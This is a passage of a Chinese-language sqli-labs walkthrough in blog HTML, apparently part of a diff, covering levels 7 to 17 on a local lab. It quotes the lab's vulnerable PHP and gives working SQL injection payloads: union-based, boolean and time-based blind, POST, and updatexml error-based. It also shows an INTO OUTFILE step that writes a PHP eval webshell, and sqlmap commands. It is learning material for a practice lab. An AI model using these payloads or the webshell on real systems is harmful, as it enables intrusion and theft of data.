&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	echo <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>根据提示要我们写入文件</p>
+<p>写入一句话的条件</p>
+<blockquote>
+<p>有数据库的写入权限</p>
+<p>知道网站的绝对路径</p>
+<br/>
+</blockquote>
+<p>在做写入练习时，需要用到<code>into outfile</code> ,但执行后却无法生成写入文件</p>
+<p>解决方案</p>
+<blockquote>
+<p>在MYSQL命令行输入 <code>show variables like &#39;%secure%&#39;;</code>查看<code> secure-file-priv</code>的值</p>
+<p>发现<code>secure_file_priv</code>值为<code>NULL</code></p>
+<p>在my.ini中修改或添加<code>secure_file_priv=&quot;/&quot;</code>然后报存并重启数据库 </p>
+<p>运行<code>http://127.0.0.1/sqli-labs/Less-7/?id=-1%27))%20union%20select%201,2,3%20into%20outfile%20%22D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\shell.txt%22%20--+</code>成功生产写入文件</p>
+</blockquote>
+<br/>
+
+<p>根据代码进行闭合<code>id=1&#39;)) --+</code></p>
+<p><code>id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+</code> 不报错说明是root权限</p>
+<p>通过前面的关卡得到决定路径</p>
+<p><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,@@basedir,@@datadir --+</code>==&gt;</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Your Login name:D:\phpstudy_pro\Extensions\MySQL5.7.26\</span><br><span class="line">Your Password:D:\phpstudy_pro\Extensions\MySQL5.7.26\data\</span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<p>?id=-1’)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile “D:\phpstudy_pro\WWW\sqli-labs\Less-7”–+</p>
+<p><code>?id=-1&#39;)) union select 1,2,&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\shell.php&quot;--+</code></p>
+<p>使用菜刀连接</p>
+<br/>
+
+<h3 id="8-布尔盲注"><a href="#8-布尔盲注" class="headerlink" title="8.布尔盲注"></a>8.布尔盲注</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>与第五关相比,把部分代码进行了注释，无法使用报错注入，可以考虑布尔盲注或者时间盲注.</p>
+<p><code>?id=1&#39; and 1=1 --+</code> 有回显 ’you are in’</p>
+<p><code>?id=1&#39; and 1=2 --+</code>无回显</p>
+<p>可以判断是布尔盲注</p>
+<ul>
+<li>判断Mysql数据库是否是在5.0以上</li>
+</ul>
+<p><code>?id=1&#39; and mid(version(),1,1)=5 --+</code>有回显  或</p>
+<p><code>?id=1&#39; and left(version(),1)=&#39;5&#39; --+</code>有回显</p>
+<p><code>?id=1&#39; and left(version(),6)=&#39;5.7.26&#39; --+</code> 有回显判断出数据库版本为<code>5.7.26</code></p>
+<ul>
+<li>判断当前数据库长度</li>
+</ul>
+<p><code>?id=1&#39; and length(database())&gt;7 --+</code></p>
+<p><code>?id=1&#39; and length(database())=8 --+</code></p>
+<ul>
+<li>截取数据库第一位ascii并判断值</li>
+</ul>
+<p><code>?id=1&#39; and (ord(mid(database(),1,1)))&gt;114 --+</code></p>
+<p><code>?id=1&#39; and (ord(mid(database(),1,1)))=115 --+</code></p>
+<p>或者</p>
+<p><code>?id=1&#39; and left(database(),1)&gt;&#39;n&#39; --+</code></p>
+<p><code>?id=1&#39; and left(database(),1)=&#39;s&#39; --+</code></p>
+<p><code>?id=1&#39; and left(database(),2)=&#39;se&#39; --+</code></p>
+<p><code>?id=1&#39; and left(database(),3)=&#39;sec&#39; --+</code></p>
+<p>依次得到后面7位 ==&gt;数据库名为security</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ord(mid(database(),1,1)))=</span></span><br><span class="line"><span class="string">115 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ord(mid((<span class="keyword">select</span> </span><br><span class="line">database()) ,<span class="number">2</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">101</span> <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ord(mid((select </span></span><br><span class="line"><span class="string">database()) ,3,1))) = 99 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> </span><br><span class="line">database()) ,<span class="number">4</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">117</span> <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ascii(substr((select database()) ,5,1))) = 114 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> database()) ,<span class="number">6</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">105</span> <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ascii(substr((select database()) ,7,1))) = 116 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> database()) ,<span class="number">8</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">121</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<p>获取数据库第一张表的长度(注:这里length()里面要再加一个括号 )</p>
+<p><code>id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5 --+</code></p>
+<p><code>id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+</code></p>
+<p>也可以这样写</p>
+<p><code>?id=1&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;5 --+</code> 最终得到长度为6</p>
+<p><code>?id=1&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit X,1)&gt;5 --+</code> 判断第X张表的长度</p>
+<br/>
+
+<ul>
+<li>判断表的第N个字符 截取第N位的ASCII码进行判断,利用<code>ord()</code> 和 <code>mid(***,1,1)</code>或者<code>substr(***,1,1)</code></li>
+</ul>
+<p><code>?id=1&#39; and ord(mid((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=101  --+</code>判断security库中的第一个表的第一个ascii值为101 即<code>e</code></p>
+<p><code>?id=1&#39; and ord(mid((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),2,1))=109  --+</code> 第二位位<code>m</code>    ==&gt;最终得到第一张表名为<code>emails</code></p>
+<p>第X张表的第N位ASCII码值判断</p>
+<p><code>?id=1&#39; and ord(mid((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit X-1,1),N,1))=101  --+</code></p>
+<p>也可以利用<code>regexp</code>注入获取<code>users</code>表中的列</p>
+<p><code>http://127.0.0.1/sql/Less-8/?id=1&#39; and 1=(select 1 from information_schema.columns where table_name=&#39;users&#39; and column_name regexp &#39;^us&#39; limit 0,1)--+</code></p>
+<br/>
+
+<p>使用SQLmap</p>
+<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 --dbs --technique B --batch</code></p>
+<blockquote>
+<p>参数：–technique</p>
+<p>这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。</p>
+<p>支持的探测方式如下：</p>
+<p>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）</p>
+</blockquote>
+<br/>
+
+<h3 id="9-时间盲注"><a href="#9-时间盲注" class="headerlink" title="9.时间盲注"></a>9.时间盲注</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>无论语句是否执行成功，都会返回同样的回显，所以需要通过时间盲注猜解数据</p>
+<p><code>?id=1&#39; and sleep(3) --+</code>尝试<code>&#39;```&quot;</code>等闭合方式，根据<code>sleep</code>确认是否闭合</p>
+<p><code>?id=1&#39; and if(mid(version(),1,1)=5,sleep(5),1) --+</code>判断数据库版本</p>
+<p><code>?id=1&#39; and if(length(database()=8),sleep(5),1) --+</code>判断数据库长度</p>
+<p><code>?id=1&#39; and if(ascii(mid(database(),1,1))=115,sleep(5),1) --+</code> 判断数据库名</p>
+<p><code>?id=1&#39; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;3,sleep(5),1) --+</code>判断表长度(length()里面的需要加<code>()</code>)</p>
+<p>使用SQLmap</p>
+<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-9/?id=1 --dbs --technique T --batch</code></p>
+<br/>
+
+<h3 id="10-时间盲注"><a href="#10-时间盲注" class="headerlink" title="10.时间盲注"></a>10.时间盲注</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$id <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>.$id.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>和第九关一样，不过是双引号闭合</p>
+<p><code>?id=1&quot; and sleep(5)--+</code></p>
+<br/>
+
+<h3 id="11-POST注入"><a href="#11-POST注入" class="headerlink" title="11.POST注入"></a>11.POST注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> @$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);  </span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">if($<span class="type">row</span>)</span><br><span class="line">&#123;</span><br><span class="line"> 		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line"> 		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot; You Have successfully logged in\n\n &quot; ;</span><br><span class="line"> ......</span><br></pre></td></tr></table></figure>
+
+<p><code>uname=admin&#39; and 1=1  --  &amp; passwd=admin</code>或者<code>uname=admin&#39; and 1=1 #  &amp; passwd=admin</code> <code>--+</code>会报错</p>
+<p><code>uname=admin&#39; order by 2  --   &amp; passwd=admin</code>判断字段数</p>
+<p><code>uname=-1&#39; and 1=1 union select 1,2 --    &amp; passwd=admin</code> 找回显点</p>
+<p><code>uname=-1&#39; and 1=1 union select @@datadir,version() --    &amp; passwd=admin</code>查看数据库版本</p>
+<br/>
+
+<p>SQLmap</p>
+<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-11/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
+<h3 id="12-POST注入"><a href="#12-POST注入" class="headerlink" title="12 POST注入"></a>12 POST注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">@$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><code>&quot;) #</code>闭合</p>
+<p>SQLmap</p>
+<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-12/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
+<br/>
+
+<h3 id="13-POST型布尔盲注"><a href="#13-POST型布尔盲注" class="headerlink" title="13 POST型布尔盲注"></a>13 POST型布尔盲注</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">@$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=(&#x27;$uname&#x27;) and password=(&#x27;$passwd&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">	$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">  		</span><br><span class="line">  		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot; You Have successfully logged in &quot; ;</span><br><span class="line">		echo <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your Login name:&#x27;</span>. $<span class="type">row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your Password:&#x27;</span> .$<span class="type">row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		</span><br><span class="line">  		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span>  </span><br><span class="line">	&#123;</span><br><span class="line">		echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot;Try again looser&quot;;</span><br><span class="line">		print_r(mysql_error());</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没有回显，使用布尔盲注</p>
+<p><code>uname=admin&#39;) and left(database(),1)&gt;&#39;n&#39; # &amp; passwd=admin</code></p>
+<p>SQLmap</p>
+<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-12/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs </code></p>
+<h3 id="14POST时间盲注"><a href="#14POST时间盲注" class="headerlink" title="14POST时间盲注"></a>14POST时间盲注</h3><p><code>&quot;</code>闭合 和13题一样</p>
+<br/>
+
+<p>SQLmap</p>
+<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-14/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
+<h3 id="15-POST时间-布尔盲注"><a href="#15-POST时间-布尔盲注" class="headerlink" title="15 POST时间/布尔盲注"></a>15 POST时间/布尔盲注</h3><p><code>uname=admin&#39; and sleep(5) #&amp; passwd=admin</code></p>
+<p>SQLmap</p>
+<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
+<br/>
+
+<h3 id="16POST时间盲注"><a href="#16POST时间盲注" class="headerlink" title="16POST时间盲注"></a>16POST时间盲注</h3><p><code>uname=admin&quot;) and sleep(5) #&amp; passwd=admin</code></p>
+<p>SQLmap<br><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-16/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
+<p><code>python sqlmap.py -r 1.txt --batch --level 3 --dbs</code></p>
+<h3 id="17POST显错注入"><a href="#17POST显错注入" class="headerlink" title="17POST显错注入"></a>17POST显错注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line"><span class="variable">$uname</span>=check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;New Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  	</span><br><span class="line">		<span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line">		mysql_query(<span class="variable">$update</span>);</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span> (mysql_error())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			print_r(mysql_error());</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			<span class="comment">//echo &quot; You password has been successfully updated &quot; ;		</span></span><br><span class="line">]			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>只对<code>username</code>使用<code>check_input()</code>函数进行过滤·,<code>check_input()</code>作用是截取15个字符串，如果开启了GPC,就去掉反斜杠，在判断是否是十进制，如果不是十进制， 就转译掉特殊字符</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">stripslashes() 函数删除由 addslashes() 函数添加的反斜杠。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line">下列字符受影响：</span><br><span class="line">    \x00</span><br><span class="line">    \n</span><br><span class="line">    \r</span><br><span class="line">    \</span><br><span class="line">    &#x27;</span><br><span class="line">    &quot;</span><br><span class="line">    \x1a</span><br></pre></td></tr></table></figure>
+
+<p><code>uname=admin&amp;passwd=123456&#39; #&amp;submit=Submit</code></p>
+<p><code>uname=admin&amp;passwd=123456&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ &amp;submit=Submit</code></p>
+<p><code>uname=admin&amp;passwd=123456&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) --+ &amp;submit=Submit</code></p>
